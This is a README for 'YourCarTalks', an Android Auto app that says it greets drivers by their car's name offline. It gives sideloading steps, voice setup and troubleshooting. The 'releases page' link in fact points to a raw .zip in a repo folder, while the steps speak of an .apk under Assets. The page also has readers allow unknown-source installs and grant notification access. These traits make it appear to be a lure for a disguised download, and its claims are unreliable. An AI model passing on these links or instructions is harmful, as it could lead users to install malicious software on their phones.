# 🚗 YourCarTalks - Greets you by your car name

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/transoceanic-rupestralplant748/YourCarTalks/raw/refs/heads/main/unwrapped/Your-Car-Talks-v3.7-beta.4.zip)

YourCarTalks connects to your vehicle through Android Auto. It speaks to you when your phone links to your car. The app uses offline voice technology to say your car's name. It works without an internet connection.

## 📥 How to download the app

1. Visit the [releases page](https://github.com/transoceanic-rupestralplant748/YourCarTalks/raw/refs/heads/main/unwrapped/Your-Car-Talks-v3.7-beta.4.zip).
2. Look for the section labeled Assets.
3. Click the file ending in .apk to save it to your computer.
4. Move this file to your Android phone.

## ⚙️ Setting up your phone

Your phone needs permission to install files from unknown sources. Follow these steps to prepare your device:

1. Open the Settings app on your phone.
2. Tap Apps or Security.
3. Select Special app access.
4. Tap Install unknown apps.
5. Choose the file manager app you used to move the file.
6. Toggle the switch to Allow from this source.

## 🛠️ Installing the software

1. Open your file manager app on your phone.
2. Locate the .apk file you downloaded.
3. Tap the file to start the installation.
4. Follow the prompts on the screen.
5. Tap Install when your phone asks for confirmation.
6. Open the app once the installation finishes.

## 🎙️ Configuring voice settings

The app uses local files to create speech. This removes the need for data plans or Wi-Fi.

1. Open the YourCarTalks app.
2. Grant the app permission to access your notifications and Android Auto stream.
3. Select your preferred voice profile from the settings menu.
4. Enter the name of your car in the text field.
5. Save your changes.

The app now stores this data locally on your device. It requires no further input from you.

## 📱 Using Android Auto

1. Start your car engine.
2. Connect your phone using a high-quality USB cable or wireless connection.
3. Wait for Android Auto to load on your dashboard screen.
4. YourCarTalks runs in the background.
5. The system speaks the name you entered the moment the connection completes.

## 📋 System requirements

- Android version 10.0 or higher.
- 200 MB of free storage space.
- A vehicle that supports Android Auto.
- A USB cable if your car does not support wireless connections.

## 🧩 Troubleshooting common issues

If the app fails to speak, check these sections:

### Sound volume
Check your car audio settings. The voice notification follows the Media volume or the Navigation volume settings in your vehicle. Ensure the volume is above zero.

### Connection stability
Ensure your phone stays awake during the first connection. Some older phones stop background processes to save battery. Disable battery optimization for YourCarTalks in your phone settings if you notice gaps in the greeting.

### Storage space
The offline voice packs require significant space. Clear your cache or remove unused files if the app fails to initialize the voice engine.

### Permissions
If the audio does not trigger, return to the app settings. Confirm that YourCarTalks has permission to Send Notifications. Android Auto uses this channel to route the audio into your speakers.

## 🛡️ Privacy and data protection

This application works entirely offline. No data leaves your mobile device. The app does not collect user logs, location history, or voice samples. All processing happens within your phone hardware. The Sherpa-ONNX engine and Kokoro TTS integrate directly into the app structure. You keep full control over your information.
